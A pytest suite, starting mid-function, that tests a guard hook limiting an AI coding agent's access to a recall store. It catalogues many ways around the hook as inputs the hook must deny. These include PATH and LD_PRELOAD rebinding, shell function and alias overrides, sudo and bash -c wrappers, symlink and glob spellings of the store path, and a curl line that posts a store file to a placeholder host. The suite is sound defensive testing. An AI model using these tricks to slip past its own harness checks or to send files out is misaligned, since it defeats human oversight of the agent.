        "ld-preload-assignment": f"LD_PRELOAD={evil}/x.so uv run {recall} filter --store {world.s}",
    }


_NOT_EXEMPT_CALLS = (
    "same-name-elsewhere",
    "dot-slash-from-another-cwd",
    "dotdot-escape",
    "python-dash-c",
    "uv-run-python-dash-c",
    "option-before-script",
    "uv-run-python",
    "interpreter-by-path",
    "py-launcher",
    "pythonpath-assignment",
    "path-assignment",
    "uv-assignment",
    "glued-paren-assignment",
    "home-assignment",
    "userprofile-assignment",
    "appdata-assignment",
    "xdg-assignment",
    "git-config-assignment",
    "conda-assignment",
    "virtual-env-assignment",
    "ld-preload-assignment",
)


@pytest.mark.parametrize("name", _NOT_EXEMPT_CALLS)
def test_csr_lookalike_recall_calls_are_not_exempt(store_world: _StoreWorld, name: str) -> None:
    """CSR-UNIT-013 (AC-23) and the exemption shape chosen for C-7 and C-8:
    each names the store and is not the pinned call, so it is denied."""
    code, out = _bash(store_world, _not_exempt_calls(store_world)[name])
    _assert_latch_denied(code, out, store_world.latch)


def test_csr_relative_pinned_path_after_a_cd_is_not_exempt(store_world: _StoreWorld) -> None:
    """A `cd` earlier in the command moves where a relative script path lands
    when it runs, so the relative operand stops counting as pinned."""
    evil = store_world.tmp / "evil"
    command = f"cd {evil.as_posix()} && uv run scripts/mem_recall.py {_filter_args(store_world)}"

    code, out = _bash(store_world, command, cwd=SCRIPTS.parent)

    _assert_latch_denied(code, out, store_world.latch)


_REDIRECT_OPS = (">", ">>", "<", "2>", "&>", "1>", ">|", "&>>", "<<<")


@pytest.mark.parametrize("form", ["spaced-into-store", "glued-into-store", "spaced-elsewhere", "glued-elsewhere"])
@pytest.mark.parametrize("op", _REDIRECT_OPS)
def test_csr_redirection_refuses_the_exemption(store_world: _StoreWorld, op: str, form: str) -> None:
    """CSR-UNIT-014 (AC-23): a redirection in an otherwise exempt segment."""
    target = f"{store_world.s}/evil" if form.endswith("into-store") else (store_world.tmp / "elsewhere").as_posix()
    gap = " " if form.startswith("spaced") else ""
    command = f"{_exempt_filter(store_world)} {op}{gap}{target}"

    code, out = _bash(store_world, command)

    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.parametrize(
    "tail",
    [" >&2", ">&2", ">{s}/evil"],
    ids=["dup-to-stderr-spaced", "dup-to-stderr-glued", "glued-to-the-store-value"],
)
def test_csr_fd_and_glued_redirection_refuse_the_exemption(store_world: _StoreWorld, tail: str) -> None:
    """CSR-UNIT-014: the fd form and a redirection glued to the --store value."""
    code, out = _bash(store_world, _exempt_filter(store_world) + tail.format(s=store_world.s))
    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.parametrize(
    "substitution",
    ["--epic $(cat {t}/epic)", "--epic `cat {t}/epic`", "--deferred <(cat {t}/d)", "--deferred >(tee {t}/d)"],
    ids=["dollar-paren", "backticks", "process-in", "process-out"],
)
def test_csr_command_substitution_refuses_the_exemption(
    store_world: _StoreWorld, substitution: str
) -> None:
    """CSR-UNIT-015 (AC-12, AC-23)."""
    arg = substitution.format(t=store_world.tmp.as_posix())
    command = f"uv run {_PINNED_OBSERVATION.as_posix()} {_write_args(store_world)} {arg}"
    code, out = _bash(store_world, command)
    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.parametrize(
    "wrapper",
    ["env {c}", "env FOO=1 {c}", "sudo {c}", 'bash -c "{c}"', "sh -c '{c}'", "time {c}", "nohup {c}", "exec {c}"],
    ids=["env", "env-assignment", "sudo", "bash-c", "sh-c", "time", "nohup", "exec"],
)
def test_csr_wrapped_recall_calls_are_not_exempt(store_world: _StoreWorld, wrapper: str) -> None:
    """CSR-UNIT-025 (AC-23): only `uv run` or a python may lead an exempt segment."""
    code, out = _bash(store_world, wrapper.format(c=_exempt_filter(store_world)))
    _assert_latch_denied(code, out, store_world.latch)


@_WINDOWS_ONLY
def test_csr_windows_pinned_script_spellings(store_world: _StoreWorld) -> None:
    """CSR-UNIT-046 (AC-12, AC-23), Windows only.

    Allowed: the pinned path with forward slashes, as a double-quoted backslash
    path, and with its drive letter in the other case. Denied, the documented
    residual: an unquoted backslash path, which POSIX shlex mangles (as Git
    Bash does when it runs it), so the script is not recognised and the call
    fails closed (recall off), never open.
    """
    posix = _PINNED_RECALL.as_posix()
    filt = f"filter --store {store_world.s}"
    for command in (
        f"uv run {posix} {filt}",
        f'uv run "{_PINNED_RECALL}" filter --store "{store_world.store}"',
        f"uv run {posix[0].swapcase()}{posix[1:]} {filt}",
    ):
        _assert_allowed(*_bash(store_world, command))

    code, out = _bash(store_world, f"uv run {_PINNED_RECALL} filter --store {store_world.store}")
    _assert_latch_denied(code, out, store_world.latch)


# --- The relocated mutant twins (CSR-UNIT-026) ---------------------------------

_BASENAME_EXEMPTION = (
    "    return _is_pinned(absolute)",
    "    return os.path.basename(operand) in _RECALL_SCRIPTS",
)
_WHOLE_COMMAND_EXEMPTION = (
    "and _exempt_segment(segment, cwd, command)",
    "and _exempt_segment(command, cwd, command)",
)


def _write_relocated_guard(tmp_path: Path, edit: tuple[str, str] | None) -> tuple[Path, Path]:
    """A copy of the hook at tmp_path/skill/scripts/hooks/, beside copies of both
    pinned scripts, so its skill root (its own location) is tmp_path/skill.
    `edit` is one textual mutation, or None for the unmutated copy."""
    src = _hook_source()
    if edit is not None:
        old, new = edit
        assert old in src, f"mutation anchor drifted out of the hook: {old!r}"
        src = src.replace(old, new, 1)
    scripts = tmp_path / "skill" / "scripts"
    (scripts / "hooks").mkdir(parents=True)
    hook = scripts / "hooks" / "guard_pretooluse.py"
    hook.write_text(src, encoding="utf-8")
    for script in (_PINNED_RECALL, _PINNED_OBSERVATION):
        shutil.copyfile(script, scripts / script.name)
    return hook, scripts


def _relocated_control(world: _StoreWorld, scripts: Path) -> str:
    return f"uv run {(scripts / 'mem_observation.py').as_posix()} {_write_args(world)}"


def _same_name_elsewhere(world: _StoreWorld) -> str:
    return _not_exempt_calls(world)["same-name-elsewhere"]


def _compound(world: _StoreWorld, scripts: Path) -> str:
    return f"{_relocated_control(world, scripts)} && cat {world.s}/runs/x.jsonl"


def test_csr_relocated_guard_pins_its_own_scripts(store_world: _StoreWorld, tmp_path: Path) -> None:
    """Baseline for the twins: relocation alone allows the control and still
    denies both bypasses, so what the twins let through is their mutation."""
    hook, scripts = _write_relocated_guard(tmp_path, None)

    _assert_allowed(*_bash(store_world, _relocated_control(store_world, scripts), hook=hook))
    for command in (_same_name_elsewhere(store_world), _compound(store_world, scripts)):
        code, out = _bash(store_world, command, hook=hook)
        _assert_latch_denied(code, out, store_world.latch)
    # The shipped scripts lie outside the copy's skill root: not exempt there.
    code, out = _bash(store_world, f"uv run {_PINNED_OBSERVATION.as_posix()} {_write_args(store_world)}", hook=hook)
    _assert_latch_denied(code, out, store_world.latch)


def test_mutant_basename_exemption_allows_a_same_named_script(
    store_world: _StoreWorld, tmp_path: Path
) -> None:
    """CSR-UNIT-026 twin: an exemption matched by basename lets the same-named
    script through, so the CSR-UNIT-013 deny reds against it; the control
    still passes, so it is the pinning, not a deny-all, that the deny rests on."""
    hook, scripts = _write_relocated_guard(tmp_path, _BASENAME_EXEMPTION)

    _assert_allowed(*_bash(store_world, _same_name_elsewhere(store_world), hook=hook))
    _assert_allowed(*_bash(store_world, _relocated_control(store_world, scripts), hook=hook))


def test_mutant_whole_command_exemption_allows_a_compound(
    store_world: _StoreWorld, tmp_path: Path
) -> None:
    """CSR-UNIT-026 twin: an exemption checked on the whole command lets the
    compound through, so the CSR-UNIT-012 deny reds against it; the control
    still passes."""
    hook, scripts = _write_relocated_guard(tmp_path, _WHOLE_COMMAND_EXEMPTION)

    _assert_allowed(*_bash(store_world, _compound(store_world, scripts), hook=hook))
    _assert_allowed(*_bash(store_world, _relocated_control(store_world, scripts), hook=hook))


def test_csr_an_unforeseen_error_under_a_latch_fails_closed(store_world: _StoreWorld, tmp_path: Path) -> None:
    """Item 6 of this PR's scope: a crash inside the latch gate denies rather
    than exiting non-zero (no decision, so the call would run)."""
    mutant = _write_mutant(
        tmp_path, "home_dirs_raises", "    homes: list[str] = []\n", '    raise RuntimeError("boom")\n'
    )
    _assert_allowed(*_bash(store_world, "ls"))

    code, out = _bash(store_world, "ls", hook=mutant)

    reason = _assert_latch_denied(code, out, store_world.latch)
    assert "could not evaluate this Bash call against the run latch (RuntimeError)" in reason
    store_world.latch.unlink()
    _assert_allowed(*_bash(store_world, "ls", hook=mutant))


# --- Unset store, latches with no store, the git gates -------------------------

_UNSET_STORES = {
    "empty": "",
    "blank": "   ",
    "unresolved-token": "{workflow.cross_session_recall_store}",
    "dollar-var": "$VAR",
    "null": None,
    "missing": "<missing>",
}


@pytest.mark.parametrize("recall", ["off", "on-red"])
@pytest.mark.parametrize("store", sorted(_UNSET_STORES))
def test_csr_unset_store_denies_nothing_by_path(store_world: _StoreWorld, store: str, recall: str) -> None:
    """CSR-UNIT-045 (AC-12, AC-11): the shipped default (`""`, recall off) and
    the other unset forms name no store, so ordinary work is untouched while
    claude-mem is still denied. Resolving `""` against the cwd would deny every
    file and Bash call in every default run."""
    state = _v2_latch(None, recall="off" if recall == "off" else "on", store_ok=False)
    value = _UNSET_STORES[store]
    if value == "<missing>":
        del state["store"]
    else:
        state["store"] = value
    _write_state(store_world.impl, state)
    src = (store_world.cwd / "src" / "x.py").as_posix()

    for tool, tool_input in (
        ("Read", {"file_path": src}),
        ("Write", {"file_path": src, "content": "x"}),
        ("Edit", {"file_path": src, "old_string": "a", "new_string": "b"}),
        ("Glob", {"pattern": "**/*.py", "path": store_world.cwd.as_posix()}),
        ("Bash", {"command": "ls"}),
    ):
        _assert_allowed(*_run_in(store_world, tool, tool_input))
    code, out = _run_in(store_world, "mcp__claude_mem__search", {})
    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.parametrize(
    "latch",
    ["v1-green-by-old-rules", "v1-red", "zero-byte", "malformed-json", "non-object", "latch-version-3"],
)
def test_csr_latch_with_no_usable_store_skips_the_store_rule(store_world: _StoreWorld, latch: str) -> None:
    """CSR-UNIT-036 under the maintainer's C-2 default: a v1 latch or one that
    does not read as v2 has no store to match, so nothing is denied by path,
    while every claude-mem call is still denied."""
    _write_state(store_world.impl, _PRESENT_LATCHES[latch](store_world.store))
    run_file = f"{store_world.s}/runs/x.jsonl"

    _assert_allowed(*_run_in(store_world, "Read", {"file_path": run_file}))
    _assert_allowed(*_bash(store_world, f"cat {run_file}"))
    code, out = _run_in(store_world, "mcp__plugin_claude-mem_mcp-search__search", {})
    _assert_latch_denied(code, out, store_world.latch)


def test_csr_v2_latch_leaves_the_git_gates_and_other_bash_alone(tmp_path: Path) -> None:
    """CSR-UNIT-037 (AC-11): the memory gate never short-circuits the git gates."""
    repo = _protected_repo(tmp_path)
    impl = tmp_path / "impl"
    home = tmp_path / "home"
    _write_state(impl, _v2_latch(home / ".ultracode-goal" / "recall"))
    env = {"ULTRACODE_IMPL_ARTIFACTS": str(impl), "HOME": str(home), "USERPROFILE": str(home)}

    code, out = _run_hook(_commit_event(repo), repo, env)
    assert code == 2
    assert "Protected-branch" in _reason(out)

    _assert_allowed(*_run_hook(_bash_event(repo, "ls -la"), repo, env))


# --- Guard item 5: self-contained, and reading the latch like mem_common -------


def test_csr_guard_imports_only_the_standard_library() -> None:
    """CSR-UNIT-035 (AC-24): no lib/ or mem_common import, no relative import."""
    tree = ast.parse(_hook_source())
    names: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            names.update(alias.name.split(".")[0] for alias in node.names)
        elif isinstance(node, ast.ImportFrom):
            assert node.level == 0, "relative import in the guard"
            names.add((node.module or "").split(".")[0])
    assert names, "the scan found no import at all"
    assert names <= set(sys.stdlib_module_names), names - set(sys.stdlib_module_names)
    assert not names & {"lib", "mem_common"}


@pytest.fixture
def mem_common():
    """lib/mem_common.py imported in-process from its file, fresh per test."""
    spec = importlib.util.spec_from_file_location("ucg_mem_common_under_test", _MEM_COMMON)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _parity_corpus(tmp_path: Path) -> dict[str, object]:
    """One latch file per shape: dict and list as JSON, str as text, bytes raw."""
    store = tmp_path / "abs" / "recall"
    without_store = _v2_latch(store)
    del without_store["store"]
    return {
        "v1-green-by-old-rules": _GREEN_STATE,
        "v1-red": {**_GREEN_STATE, "recall": "off"},
        "v2-green": _v2_latch(store),
        "v2-red": _v2_latch(store, store_ok=False),
        "v2-recall-off": _v2_latch(store, recall="off"),
        "v2-other-backend": _v2_latch(store, backend="claude-mem"),
        "v2-store-ok-string": _v2_latch(store, store_ok="true"),
        "v2-without-store": without_store,
        "v2-store-null": _v2_latch(None),
        "v2-store-empty": _v2_latch(""),
        "v2-store-blank": _v2_latch("   "),
        "v2-store-token": _v2_latch("{workflow.cross_session_recall_store}"),
        "v2-store-dollar-var": _v2_latch("$VAR"),
        "v2-store-relative": _v2_latch("recall"),
        "v2-store-nul": _v2_latch("/abs/re\0call"),
        "v2-store-number": {**_v2_latch(store), "store": 7},
        "v2-store-tilde": _v2_latch("~/.ultracode-goal/recall"),
        "v2-store-dollar-in-name": _v2_latch(tmp_path / "my$proj" / ".recall"),
        "v2-store-trailing-separator": _v2_latch(str(store) + os.sep),
        "v2-store-dot-dot": _v2_latch(os.path.join(str(store.parent), "x", "..", "recall")),
        "version-3": _v2_latch(store, latch_version=3),
        "version-bool": _v2_latch(store, latch_version=True),
        "version-string": _v2_latch(store, latch_version="2"),
        "version-float": _v2_latch(store, latch_version=2.0),
        "zero-byte": "",
        "whitespace-only": "  \n\t",
        "malformed": "{not: valid json,,,",
        "non-object-list": [1, 2],
        "json-string": '"latch"',
        "json-null": "null",
        "utf8-bom": "﻿" + json.dumps(_v2_latch(store)),
        "invalid-utf8": (
            b'{"latch_version": 2, "backend": "jsonl", "store_ok": true, '
            b'"recall": "on", "store": "\xff/recall"}'
        ),
        # json.loads raises RecursionError on these: both readers read None.
        "deep-array": "[" * 100000 + "]" * 100000,
        "deep-object": '{"a":' * 50000 + "1" + "}" * 50000,
    }


_PARITY_NAMES = sorted(_parity_corpus(Path("/corpus-names")))


def _write_latch_payload(impl: Path, payload: object) -> Path:
    impl.mkdir(parents=True, exist_ok=True)
    path = impl / ".mem-state.json"
    if isinstance(payload, bytes):
        path.write_bytes(payload)
    elif isinstance(payload, str):
        path.write_text(payload, encoding="utf-8")
    else:
        path.write_text(json.dumps(payload), encoding="utf-8")
    return path


@pytest.mark.parametrize("name", _PARITY_NAMES)
def test_csr_guard_reads_a_latch_like_mem_common(
    guard_module, mem_common, tmp_path: Path, monkeypatch, name: str
) -> None:
    """CSR-UNIT-016 (AC-24, AC-16): one latch file, two readers, one answer:
    version, colour and the resolved absolute store path."""
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))
    impl = tmp_path / "impl"
    path = _write_latch_payload(impl, _parity_corpus(tmp_path)[name])

    ours = guard_module._latch_view(guard_module._read_latch(path))
    theirs = mem_common.latch_view(mem_common.read_state(impl))

    assert ours == theirs


def test_csr_parity_corpus_reads_as_the_spec_says(guard_module, tmp_path: Path, monkeypatch) -> None:
    """Anchors for the parity row, so the two readers cannot agree on a wrong
    answer: a v1 latch is red with no store (AC-16), a green v2 latch carries
    its resolved store, `~` resolves against the home, a missing latch reads as
    nothing."""
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))
    corpus = _parity_corpus(tmp_path)
    store = str(tmp_path / "abs" / "recall")

    def view(name: str) -> tuple:
        path = _write_latch_payload(tmp_path / name, corpus[name])
        got = guard_module._latch_view(guard_module._read_latch(path))
        return got["latch_version"], got["store_ok"], got["store"]

    assert view("v1-green-by-old-rules") == (1, False, None)
    assert view("v2-green") == (2, True, store)
    assert view("v2-red") == (2, False, store)
    assert view("v2-recall-off") == (2, False, store)
    assert view("v2-store-tilde") == (2, True, str(home / ".ultracode-goal" / "recall"))
    assert view("v2-store-trailing-separator") == (2, True, store)
    assert view("v2-store-dot-dot") == (2, True, store)
    assert view("v2-store-empty") == (2, False, None)
    assert view("version-3") == (3, False, None)
    assert view("zero-byte") == (None, False, None)
    assert guard_module._read_latch(tmp_path / "nowhere" / ".mem-state.json") is None


@_NEEDS_GIT
def test_csr_guard_denies_the_run_file_a_real_latch_and_write_produced(tmp_path: Path) -> None:
    """CSR-INT-037 (AC-24, AC-12, AC-23): end to end. The real `latch` and the
    real `write` land a run file under ~/.ultracode-goal/recall; under the latch
    `latch` wrote, the real guard denies a Read and a Bash `cat` of that exact
    file, and lets the pinned reader through."""
    home = tmp_path / "home"
    home.mkdir()
    repo = tmp_path / "widget"
    repo.mkdir()
    _init_repo(repo, "ultracode/epic-7")
    impl = tmp_path / "impl"
    store_value = "~/.ultracode-goal/recall"
    env = {**os.environ, "HOME": str(home), "USERPROFILE": str(home)}

    def script(path: Path, *args: str) -> None:
        proc = subprocess.run(
            [sys.executable, str(path), *args],
            capture_output=True, text=True, encoding="utf-8", env=env,
        )
        assert proc.returncode == 0, proc.stdout + proc.stderr

    script(
        _PINNED_RECALL, "latch", "--impl-artifacts", str(impl), "--run-id", _RUN,
        "--recall", "on", "--store", store_value, "--cwd", str(repo),
    )
    script(
        _PINNED_OBSERVATION, "write", "--impl-artifacts", str(impl), "--store", store_value,
        "--epic", "7", "--run-id", _RUN, "--gate-status", "PASS", "--verdict", "advance",
        "--cwd", str(repo), "--valid-until-date", "2026-06-04",
    )
    runs = sorted((home / ".ultracode-goal" / "recall").glob("*/runs/*.jsonl"))
    assert [p.name for p in runs] == [f"{_RUN}.jsonl"]
    run_file = runs[0]
    latch = impl / ".mem-state.json"
    hook_env = {"HOME": str(home), "USERPROFILE": str(home), "ULTRACODE_IMPL_ARTIFACTS": str(impl)}

    for tool, tool_input in (
        ("Read", {"file_path": str(run_file)}),
        ("Bash", {"command": f"cat {run_file.as_posix()}"}),
    ):
        code, out = _run_hook(_mem_event(tool, repo, tool_input), repo, hook_env)
        _assert_latch_denied(code, out, latch)

    reader = (
        f"uv run {_PINNED_RECALL.as_posix()} filter --impl-artifacts {impl.as_posix()} "
        f"--store {store_value} --cwd {repo.as_posix()}"
    )
    _assert_allowed(*_run_hook(_bash_event(repo, reader), repo, hook_env))


# --- Review rows: each was allowed by the guard as first built ------------------
# Every deny row below was reproduced against the first build of this change
# (allowed there) before it was closed. Unless a row says otherwise, it runs
# under the green v2 `store_world` latch.


def _symlink_or_skip(link: Path, target: Path) -> None:
    try:
        os.symlink(target, link, target_is_directory=target.is_dir())
    except (OSError, NotImplementedError) as exc:
        pytest.skip(f"cannot create a symlink here: {exc}")


_V2_COLOURS = ("v2-store-ok", "v2-store-not-ok", "v2-recall-off")


@pytest.mark.parametrize("latch", _V2_COLOURS)
def test_csr_store_rule_follows_the_store_whatever_the_v2_colour(
    store_world: _StoreWorld, latch: str
) -> None:
    """The rule reads the latch's `store`, not its colour: a red latch and the
    default recall-off latch, which still carries the store, deny as well, and
    the pinned call still passes under each (bmad review 1)."""
    _write_state(store_world.impl, _PRESENT_LATCHES[latch](store_world.store))
    run_file = f"{store_world.s}/runs/x.jsonl"

    for tool, tool_input in (("Read", {"file_path": run_file}), ("Bash", {"command": f"cat {run_file}"})):
        reason = _assert_latch_denied(*_run_in(store_world, tool, tool_input), store_world.latch)
        assert "names the recall store" in reason
    _assert_allowed(*_bash(store_world, _exempt_filter(store_world)))


def test_csr_segment_whose_quoting_does_not_parse_is_read_raw(store_world: _StoreWorld) -> None:
    """The quote-blind split leaves `b' ~/...` behind, which shlex cannot read;
    its raw text still names the store (bmad review 2)."""
    code, out = _bash(store_world, "cat 'a;b' ~/.ultracode-goal/recall/runs/x.jsonl")
    _assert_latch_denied(code, out, store_world.latch)


def test_csr_relative_path_resolves_against_the_event_cwd(
    store_world: _StoreWorld, tmp_path: Path
) -> None:
    """The event's cwd, not the hook process's own, is the base (bmad review 3)."""
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    parent = store_world.store.parent
    relative = {"file_path": "recall/runs/x.jsonl"}

    code, out = _run_mutant_hook(HOOK, _mem_event("Read", parent, relative), elsewhere, store_world.env)
    _assert_latch_denied(code, out, store_world.latch)
    _assert_allowed(*_run_mutant_hook(HOOK, _mem_event("Read", elsewhere, relative), parent, store_world.env))


def test_csr_symlinked_skill_pins_both_the_link_and_the_real_path(
    store_world: _StoreWorld, tmp_path: Path
) -> None:
    """C-11: a guard run through a symlinked skill folder admits the pinned
    scripts by the path it runs from and by their resolved path (bmad review 4)."""
    _, scripts = _write_relocated_guard(tmp_path, None)
    linked = tmp_path / "linked-skill"
    _symlink_or_skip(linked, scripts.parent)
    hook = linked / "scripts" / "hooks" / "guard_pretooluse.py"

    for root in (linked / "scripts", scripts):
        command = f"uv run {(root / 'mem_recall.py').as_posix()} {_filter_args(store_world)}"
        _assert_allowed(*_bash(store_world, command, hook=hook))


def test_csr_userprofile_spellings_read_userprofile_when_home_differs(tmp_path: Path) -> None:
    """HOME and USERPROFILE on two folders: a USERPROFILE spelling is read
    against the folder that variable holds (bmad review 5)."""
    home, profile = tmp_path / "home", tmp_path / "profile"
    store = profile / ".ultracode-goal" / "recall"
    store.mkdir(parents=True)
    home.mkdir()
    repo = tmp_path / "repo"
    repo.mkdir()
    impl = tmp_path / "impl"
    _write_state(impl, _v2_latch(store))
    env = {"HOME": str(home), "USERPROFILE": str(profile), "ULTRACODE_IMPL_ARTIFACTS": str(impl)}

    for spelling in ("%USERPROFILE%", "$USERPROFILE", "${USERPROFILE}"):
        command = f"cat {spelling}/.ultracode-goal/recall/runs/x.jsonl"
        code, out = _run_hook(_bash_event(repo, command), repo, env)
        _assert_latch_denied(code, out, impl / ".mem-state.json")


@pytest.mark.skipif(
    sys.platform == "win32",
    reason="Win32 folds `..` before it follows a link, so the lexical path is the one that runs",
)
def test_csr_dotdot_out_of_a_symlinked_folder_is_not_the_pinned_script(
    store_world: _StoreWorld, tmp_path: Path
) -> None:
    """`<scripts>/sub/../mem_recall.py` folds lexically to the pinned path, but
    with `sub` a link elsewhere the shell runs another file (bmad review 7)."""
    hook, scripts = _write_relocated_guard(tmp_path, None)
    evil = tmp_path / "evil" / "x"
    evil.mkdir(parents=True)
    (evil.parent / "mem_recall.py").write_text("print('not the pinned script')\n", encoding="utf-8")
    _symlink_or_skip(scripts / "sub", evil)

    twin = f"uv run {(scripts / 'sub').as_posix()}/../mem_recall.py {_filter_args(store_world)}"
    code, out = _bash(store_world, twin, hook=hook)
    _assert_latch_denied(code, out, store_world.latch)
    pinned = f"uv run {(scripts / 'mem_recall.py').as_posix()} {_filter_args(store_world)}"
    _assert_allowed(*_bash(store_world, pinned, hook=hook))


def test_csr_deny_reason_quotes_a_long_segment_cut_short(store_world: _StoreWorld) -> None:
    """A heredoc is one segment: its reason quotes at most 160 characters of it,
    not the whole body back into the model's context (bmad review 10)."""
    body = "x " * 20000
    segment = f"cat {store_world.s}/runs/x.jsonl {body}"
    code, out = _bash(store_world, segment)

    reason = _assert_latch_denied(code, out, store_world.latch)
    assert len(reason) < 2000
    # The first 160 characters, whatever the length of the tmp path (a Windows
    # runner's is long enough that the cut falls inside the store path).
    assert f"segment {segment.strip()[:160] + '...'!r} names the recall store" in reason


def _rebinding_commands(world: _StoreWorld) -> dict[str, str]:
    call = _exempt_filter(world)
    evil = (world.tmp / "evil").as_posix()
    return {
        "export-path": f"export PATH={evil}:$PATH; {call}",
        "bare-path-assignment": f"PATH={evil}:$PATH; {call}",
        "path-append": f"PATH+=:{evil}; {call}",
        "path-element": f"PATH[0]={evil}; {call}",
        "declare-x": f"declare -x PYTHONPATH={evil} && {call}",
        "function-definition": f'uv() {{ cat "$3"; }}; {call}',
        "function-keyword": f'function uv {{ cat "$3"; }}; {call}',
        "hash-p": f"hash -p {evil}/uv uv; {call}",
        "alias": f"shopt -s expand_aliases; alias uv={evil}/uv; {call}",
        "dot-source": f". {evil}/env.sh && {call}",
        "source": f"source {evil}/env.sh && {call}",
        "eval": f"eval 'uv() {{ :; }}'; {call}",
        "enable": f"enable -f {evil}/uv.so uv; {call}",
        "unset-path": f"unset PATH; {call}",
        "for-loop-variable": f"for PATH in {evil}; do {call}; done",
        "read": f"read -r PATH <<< {evil}; {call}",
        "printf-v": f"printf -v PATH %s {evil}; {call}",
        "let": f"let PATH=1; {call}",
        "arithmetic": f"(( PATH = 1 )); {call}",
        "default-assignment": f": ${{UV_PYTHON:={evil}/python}}; {call}",
        "backgrounded-export": f"export PATH={evil} & {call}",
        "newline-export": f"export PATH={evil}\n{call}",
        "piped-export": f"export PATH={evil} | {call}",
    }


_REBINDING_COMMANDS = (
    "export-path",
    "bare-path-assignment",
    "path-append",
    "path-element",
    "declare-x",
    "function-definition",
    "function-keyword",
    "hash-p",
    "alias",
    "dot-source",
    "source",
    "eval",
    "enable",
    "unset-path",
    "for-loop-variable",
    "read",
    "printf-v",
    "let",
    "arithmetic",
    "default-assignment",
    "backgrounded-export",
    "newline-export",
    "piped-export",
)


@pytest.mark.parametrize("name", _REBINDING_COMMANDS)
def test_csr_command_that_rebinds_uv_or_python_exempts_nothing(
    store_world: _StoreWorld, name: str
) -> None:
    """An earlier segment that changes what `uv` or `python` resolves to, or the
    environment it runs with, refuses the exemption to the pinned segment after
    it, which names the store and is denied (bypass review 1, bmad review 14)."""
    code, out = _bash(store_world, _rebinding_commands(store_world)[name])

    reason = _assert_latch_denied(code, out, store_world.latch)
    assert "names the recall store" in reason


@pytest.mark.parametrize(
    "lead",
    [
        "set -euo pipefail; ",
        "echo start && ",
        "cd {tmp} && ",
        "true && echo 'export PATH is only a word here' && ",
    ],
    ids=["set-options", "echo-first", "cd-then-absolute-script", "builtin-name-as-an-argument"],
)
def test_csr_command_that_rebinds_nothing_keeps_the_exemption(store_world: _StoreWorld, lead: str) -> None:
    """Controls: options, an unrelated segment, a `cd` before an absolute
    script path, and a rebinding builtin's name as a mere argument."""
    command = lead.format(tmp=store_world.tmp.as_posix()) + _exempt_filter(store_world)
    _assert_allowed(*_bash(store_world, command))


@pytest.mark.parametrize(
    "form",
    [
        "tool -o{s}/runs/x.jsonl",
        "curl -d @{s}/runs/x.jsonl http://h",
        "curl file://{s}/runs/x.jsonl",
        "rsync localhost:{s}/runs/x.jsonl .",
        "tool -o$HOME/.ultracode-goal/recall/runs/x.jsonl",
        "PYTHONPATH=/x:{s} cmd",
    ],
    ids=["option-glued", "at-glued", "file-url", "host-colon", "option-glued-home-variable", "colon-list"],
)
def test_csr_store_root_behind_a_prefix_in_one_word_denied(store_world: _StoreWorld, form: str) -> None:
    """The store root found anywhere in a word, not only where a path starts
    (bypass review 2)."""
    code, out = _bash(store_world, form.format(s=store_world.s))
    _assert_latch_denied(code, out, store_world.latch)


def test_csr_name_that_only_starts_like_the_store_is_allowed(store_world: _StoreWorld) -> None:
    """Control for the root search: a longer last name is another folder."""
    for command in (f"cat {store_world.s}.bak/x", f"tool -o{store_world.s}2/x"):
        _assert_allowed(*_bash(store_world, command))


def test_csr_symlink_to_an_ancestor_does_not_hide_the_store(store_world: _StoreWorld) -> None:
    """A link to a folder above the store, made by an earlier allowed call, is
    resolved before the comparison (bypass review 3)."""
    link = store_world.tmp / "lnk"
    _symlink_or_skip(link, store_world.store.parent)
    inside = f"{link.as_posix()}/recall/runs/x.jsonl"

    for tool, tool_input in (
        ("Bash", {"command": f"cat {inside}"}),
        ("Read", {"file_path": inside}),
        ("Glob", {"pattern": "*.jsonl", "path": f"{link.as_posix()}/recall/runs"}),
    ):
        code, out = _run_in(store_world, tool, tool_input)
        _assert_latch_denied(code, out, store_world.latch)
    _assert_allowed(*_bash(store_world, f"ls {link.as_posix()}"))


def test_csr_symlink_to_the_store_is_the_store(store_world: _StoreWorld) -> None:
    link = store_world.tmp / "store-link"
    _symlink_or_skip(link, store_world.store)
    code, out = _bash(store_world, f"ls {link.as_posix()}")
    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.skipif(not os.path.isdir("/proc/self/root"), reason="no /proc/self/root here")
def test_csr_proc_self_root_spelling_denied(store_world: _StoreWorld) -> None:
    """Bypass review 3."""
    code, out = _bash(store_world, f"cat /proc/self/root{store_world.s}/runs/x.jsonl")
    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.skipif(sys.platform == "win32", reason="`//` starts a UNC path on Windows")
def test_csr_double_slash_prefix_denied(store_world: _StoreWorld) -> None:
    """POSIX abspath keeps exactly two leading slashes; the guard collapses them
    (bypass review 3)."""
    path = f"/{store_world.s}/runs/x.jsonl"
    for tool, tool_input in (("Bash", {"command": f"cat {path}"}), ("Read", {"file_path": path})):
        code, out = _run_in(store_world, tool, tool_input)
        _assert_latch_denied(code, out, store_world.latch)


_OVER_THE_BRACE_CAP = "{" + ",".join(f"d{index}" for index in range(80)) + ",recall}"


@pytest.mark.parametrize(
    "command",
    [
        "ls ~/.ultracode-goal/recall*",
        "cat ~/.ultracode-goal/rec?ll/runs/x.jsonl",
        "cat ~/.ultracode-goal/[r]ecall/runs/x.jsonl",
        "cat ~/.ultracode-goal/{recall,other}/runs/x.jsonl",
        "cat ~/{.ultracode-goal/recall,other}/runs/x.jsonl",
        "cat ~/.ultracode-goal/re{c..c}all/runs/x.jsonl",
        f"cat ~/.ultracode-goal/{_OVER_THE_BRACE_CAP}/runs/x.jsonl",
    ],
    ids=["star", "question-mark", "bracket", "brace-list", "brace-across-a-slash", "brace-sequence", "brace-past-the-cap"],
)
def test_csr_glob_and_brace_spellings_of_the_store_denied(store_world: _StoreWorld, command: str) -> None:
    """A glob that can match the store, and a brace expansion that yields it
    (bypass review 4, bmad review 15)."""
    code, out = _bash(store_world, command)
    _assert_latch_denied(code, out, store_world.latch)


